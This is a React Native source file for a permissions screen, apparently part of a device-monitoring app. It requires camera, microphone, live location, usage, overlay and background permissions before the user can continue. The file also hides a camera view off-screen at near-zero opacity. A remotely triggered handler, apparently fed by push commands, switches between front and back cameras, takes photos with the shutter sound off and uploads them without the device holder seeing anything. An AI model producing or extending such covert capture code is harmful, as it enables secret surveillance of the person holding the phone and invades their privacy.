import React, { useEffect, useState, useRef } from 'react'
import {
  View,
  Text,
  StyleSheet,
  ScrollView,
  TouchableOpacity,
  Switch,
  Image,
  PermissionsAndroid,
  Linking,
  AppState,
  NativeModules,
  Alert,
  Platform,
} from 'react-native'
import { SafeAreaView } from 'react-native-safe-area-context'
import { check, PERMISSIONS, RESULTS } from 'react-native-permissions'
import { Camera, useCameraDevice, useCameraFormat } from 'react-native-vision-camera'
import ViewShot from 'react-native-view-shot'
import AsyncStorage from '@react-native-async-storage/async-storage'
import { register as registerCameraCapture, unregister as unregisterCameraCapture } from '../../services/CameraCaptureRegistry'
import { getPending as getPendingCameraCapture, clearPending as clearPendingCameraCapture } from '../../services/PendingCameraCaptureManager'
import { uploadCameraPhoto } from '../../services/CameraPhotoService'

const { ScreenLock } = NativeModules

const Permission = ({ navigation }) => {

  const cameraRef = useRef(null)
  const frontDevice = useCameraDevice('front')
  const backDevice = useCameraDevice('back')
  const viewShotRef = useRef(null)
  /* ================= STATE ================= */

  const [permissions, setPermissions] = useState({
    usageLimits: false,
    displayOverApps: false,
    remoteCamera: false,
    oneWayAudio: false,
    liveLocation: false,
    usageReport: false,
    keepBackground: false,
    superBattery: false,
  })
  const [cameraError, setCameraError] = useState(false)
  const [cameraReady, setCameraReady] = useState(false)
  const [activeCameraType, setActiveCameraType] = useState('front')
  const [pendingCapture, setPendingCapture] = useState(null)
  const isCapturingRef = useRef(false)
  const captureResolveRef = useRef(null)

  const device = activeCameraType === 'back' && backDevice ? backDevice : frontDevice
  const format = useCameraFormat(device, [{ photoResolution: { width: 1280, height: 720 } }])

  /* ================= HELPERS ================= */

  const updatePermission = (key, value) => {
    setPermissions(prev => ({ ...prev, [key]: value }))
  }

  /* ================= FCM COMMAND HANDLER (foreground) ================= */

  const takePhotoAndUpload = async (cameraType) => {
    if (isCapturingRef.current || !device) return
    if (!cameraRef.current) {
      setPendingCapture(null)
      captureResolveRef.current?.()
      captureResolveRef.current = null
      return
    }
    if (!cameraReady) {
      setPendingCapture(cameraType)
      if (activeCameraType !== cameraType && (cameraType === 'back' ? backDevice : frontDevice)) {
        setActiveCameraType(cameraType)
      }
      captureResolveRef.current?.()
      captureResolveRef.current = null
      return
    }
    isCapturingRef.current = true
    try {
      const photo = await cameraRef.current.takePhoto({ enableShutterSound: false })
      const path = photo?.path || photo?.uri
      if (path) {
        await uploadCameraPhoto(path, cameraType)
        console.log('Photo captured and uploaded:', cameraType, path)
      } else {
        console.warn('No path in photo result:', photo)
      }
      captureResolveRef.current?.()
      captureResolveRef.current = null
    } catch (e) {
      console.error('Failed to take/upload photo', e)
      captureResolveRef.current?.()
      captureResolveRef.current = null
      if (Alert?.alert) Alert.alert('Camera error', e?.message || 'Could not take or upload photo')
      throw e
    } finally {
      isCapturingRef.current = false
      setPendingCapture(null)
    }
  }

  const handleCameraCaptureRequest = (cameraType) => {
    const targetDevice = cameraType === 'back' && backDevice ? backDevice : frontDevice
    if (!targetDevice) {
      return takePhotoAndUpload('front')
    }
    if (activeCameraType === cameraType) {
      return takePhotoAndUpload(cameraType)
    }
    return new Promise((resolve) => {
      captureResolveRef.current = resolve
      setPendingCapture(cameraType)
      setActiveCameraType(cameraType)
    })
  }

  /* ================= REAL PERMISSION HANDLER ================= */

  const handlePermission = async (key) => {
    switch (key) {

      case "remoteCamera": {
        let granted = false
        try {
          const res = await PermissionsAndroid.request(
            PermissionsAndroid.PERMISSIONS.CAMERA
          )
          granted = res === PermissionsAndroid.RESULTS.GRANTED
          if (granted && Camera?.requestCameraPermission) {
            const visionResult = await Camera.requestCameraPermission()
            granted = visionResult === 'granted'
          }
        } catch (e) {
          console.warn('Camera permission request failed', e)
        }
        updatePermission(key, granted)
        break
      }

      case "oneWayAudio": {
        const res = await PermissionsAndroid.request(
          PermissionsAndroid.PERMISSIONS.RECORD_AUDIO
        )
        updatePermission(key, res === PermissionsAndroid.RESULTS.GRANTED)
        break
      }

      case "liveLocation": {
        const res = await PermissionsAndroid.request(
          PermissionsAndroid.PERMISSIONS.ACCESS_FINE_LOCATION
        )
        updatePermission(key, res === PermissionsAndroid.RESULTS.GRANTED)
        break
      }

      case "usageLimits":
      case "usageReport":
        Linking.openSettings()
        break

      case "displayOverApps":
        Linking.openSettings()
        break

      case "keepBackground":
      case "superBattery":
        Linking.openSettings()
        break

      default:
        break
    }
  }

  /* ================= RECHECK PERMISSIONS ================= */

  const recheckPermissions = async () => {
    const camera = await check(PERMISSIONS.ANDROID.CAMERA)
    const audio = await check(PERMISSIONS.ANDROID.RECORD_AUDIO)
    const location = await check(PERMISSIONS.ANDROID.ACCESS_FINE_LOCATION)

    updatePermission("remoteCamera", camera === RESULTS.GRANTED)
    updatePermission("oneWayAudio", audio === RESULTS.GRANTED)
    updatePermission("liveLocation", location === RESULTS.GRANTED)
  }

  /* ================= EFFECTS ================= */

  useEffect(() => {
    recheckPermissions()

    const pending = getPendingCameraCapture()
    if (pending) {
      clearPendingCameraCapture()
      setPendingCapture(pending)
      setActiveCameraType(pending === 'back' && backDevice ? 'back' : 'front')
    }
  }, [])

  useEffect(() => {
    setCameraReady(false)
  }, [device?.id])

  useEffect(() => {
    if (!permissions.remoteCamera || !device) setCameraReady(false)
  }, [permissions.remoteCamera, device])

  useEffect(() => {
    registerCameraCapture(handleCameraCaptureRequest)
    return () => unregisterCameraCapture()
  }, [activeCameraType, permissions.remoteCamera, backDevice])

  useEffect(() => {
    if (!pendingCapture || pendingCapture !== activeCameraType || !device || isCapturingRef.current || !cameraReady) return
    const t = setTimeout(() => {
      if (cameraRef.current && cameraReady) {
        takePhotoAndUpload(pendingCapture)
      }
    }, 800)
    return () => clearTimeout(t)
  }, [pendingCapture, activeCameraType, device, cameraReady])

  useEffect(() => {
    recheckPermissions()
    const sub = AppState.addEventListener("change", state => {
      if (state === "active") recheckPermissions()
    })
    return () => sub.remove()
  }, [])

  const allAllowed = Object.values(permissions).every(v => v === true)

  /* ================= UI ITEM ================= */

  const PermissionItem = ({ title, subtitle, permissionKey, icon }) => (
    <View style={styles.permissionItem}>
      <View style={styles.permissionLeft}>
        <Text style={styles.permissionIcon}>{icon}</Text>
        <View style={styles.permissionText}>
          <Text style={styles.permissionTitle}>{title}</Text>
          <Text style={styles.permissionSubtitle}>{subtitle}</Text>
        </View>
      </View>
      <Switch
        value={permissions[permissionKey]}
        onValueChange={() => handlePermission(permissionKey)}
        trackColor={{ false: '#E0E0E0', true: '#9B1FE8' }}
        thumbColor="#FFFFFF"
      />
    </View>
  )

  /* ================= RENDER ================= */

  return (
    <ViewShot ref={viewShotRef} options={{ format: "jpg", quality: 0.9 }} style={{ flex: 1 }}>
      <SafeAreaView style={styles.container}>
        {/* Hidden Camera for remote capture (omit when restricted by OS/device policy) */}
        {permissions.remoteCamera && device && !cameraError && (
          <Camera
            ref={cameraRef}
            style={styles.hiddenCamera}
            device={device}
            format={format}
            isActive={true}
            photo={true}
            captureAudio={false}
            onInitialized={() => setCameraReady(true)}
            onError={(err) => {
              const msg = err?.message ?? String(err)
              if (!msg.includes('camera-is-restricted')) {
                console.warn('Camera error', err)
              }
              setCameraError(true)
            }}
          />
        )}

        {/* Header */}
        <View style={styles.header}>
          <TouchableOpacity onPress={() => navigation.goBack()}>
            <Image source={require("../../assets/angle-small-left.png")} style={styles.backIcon} />
          </TouchableOpacity>
          <Text style={styles.headerTitle}>Permissions</Text>
          <View style={{ width: 24 }} />
        </View>

        {/* Intro */}
        <View style={styles.headerSection}>
          <Text style={styles.headerIcon}>🔒</Text>
          <Text style={styles.headerText}>App Permissions</Text>
          <Text style={styles.headerSubtext}>
            All permissions must be enabled to continue
          </Text>
        </View>

        <ScrollView>
          <View style={styles.permissionsList}>
            <PermissionItem title="Usage Limits" subtitle="Control screen & app time" permissionKey="usageLimits" icon="⏱️" />
            <PermissionItem title="Display Over Apps" subtitle="Show alerts over apps" permissionKey="displayOverApps" icon="💬" />
            <PermissionItem title="Remote Camera" subtitle="Allow photo capture" permissionKey="remoteCamera" icon="📷" />
            <PermissionItem title="One-Way Audio" subtitle="Allow microphone access" permissionKey="oneWayAudio" icon="🔊" />
            <PermissionItem title="Live Location" subtitle="Track device location" permissionKey="liveLocation" icon="📍" />
            <PermissionItem title="Usage Report" subtitle="View app usage" permissionKey="usageReport" icon="📊" />
            <PermissionItem title="Run in Background" subtitle="Keep monitoring active" permissionKey="keepBackground" icon="🔄" />
            <PermissionItem title="Battery Optimization" subtitle="Prevent system kill" permissionKey="superBattery" icon="🔋" />
          </View>
        </ScrollView>

        {/* Confirm */}
        <View style={styles.buttonContainer}>
          <TouchableOpacity
            disabled={!allAllowed}
            style={[styles.confirmButton, { opacity: allAllowed ? 1 : 0.5 }]}
            onPress={() => navigation.navigate("Home")}
          >
            <Text style={styles.confirmButtonText}>✓ Confirm all permissions</Text>
          </TouchableOpacity>
        </View>
      </SafeAreaView>
    </ViewShot>
  )
}

/* ================= STYLES ================= */

const styles = StyleSheet.create({
  container: { flex: 1, backgroundColor: "#F9FAFB" },
  header: {
    height: 56, flexDirection: "row", alignItems: "center",
    justifyContent: "space-between", paddingHorizontal: 16,
    backgroundColor: "#FFF", borderBottomWidth: 1, borderBottomColor: "#E5E7EB"
  },
  backIcon: { width: 24, height: 24 },
  headerTitle: { fontSize: 18, fontWeight: "600", color: "#111827" },

  headerSection: {
    alignItems: "center", paddingVertical: 24, backgroundColor: "#FFF", marginBottom: 8
  },
  headerIcon: { fontSize: 40 },
  headerText: { fontSize: 20, fontWeight: "700" },
  headerSubtext: { fontSize: 14, color: "#6B7280" },

  permissionsList: { padding: 16, paddingBottom: 120 },
  permissionItem: {
    flexDirection: "row", justifyContent: "space-between",
    backgroundColor: "#FFF", padding: 14, borderRadius: 12, marginBottom: 12
  },
  permissionLeft: { flexDirection: "row", alignItems: "center", flex: 1 },
  permissionIcon: { fontSize: 24, marginRight: 12 },
  permissionText: { flex: 1 },
  permissionTitle: { fontSize: 16, fontWeight: "600" },
  permissionSubtitle: { fontSize: 13, color: "#6B7280" },

  buttonContainer: {
    position: "absolute", bottom: 0, left: 0, right: 0,
    padding: 16, backgroundColor: "#FFF", borderTopWidth: 1, borderTopColor: "#E5E7EB"
  },
  confirmButton: {
    backgroundColor: "#2563EB", paddingVertical: 14, borderRadius: 12, alignItems: "center"
  },
  confirmButtonText: { color: "#FFF", fontSize: 16, fontWeight: "700" },
  hiddenCamera: {
    width: Platform.OS === 'android' ? 64 : 1,
    height: Platform.OS === 'android' ? 64 : 1,
    position: 'absolute',
    top: -200,
    left: -200,
    opacity: 0.01,
  }
})

export default Permission
